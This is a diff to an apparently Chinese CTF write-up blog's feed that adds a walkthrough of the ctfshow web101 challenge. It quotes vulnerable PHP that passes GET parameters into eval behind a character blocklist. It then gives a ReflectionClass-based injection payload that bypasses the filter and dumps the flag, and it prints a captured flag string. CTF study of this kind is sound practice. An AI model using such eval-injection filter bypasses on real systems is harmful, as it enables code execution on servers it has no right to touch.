@@ -2868,6 +2868,16 @@ paylaod为</p>
 <p>然而一共35位还少了一位，最后一位需要不断提交flag爆破，0-9a-f一共试最多16次即可得到flag，我试到第六次提交成功😭</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;1ce37630-8dc7-4b87-9f0e-1eea5dada156&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="web101"><a class="header-anchor" href="#web101">¶</a>web101</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>在上一题基础上多进行了过滤，所以上题payload无法使用，查了一下资料，发现还有类反射的知识点</p>
+<blockquote>
+<p>PHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。<br>
+$class = new ReflectionClass(‘ctfshow’); // 建立 Person这个类的反射类<br>
+$instance  = $class-&gt;newInstanceArgs($args); // 相当于实例化ctfshow类</p>
+</blockquote>
+<p>paylaod为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure>
+<p>也要像上题一样改掉0x2d和最后一位进行爆破</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
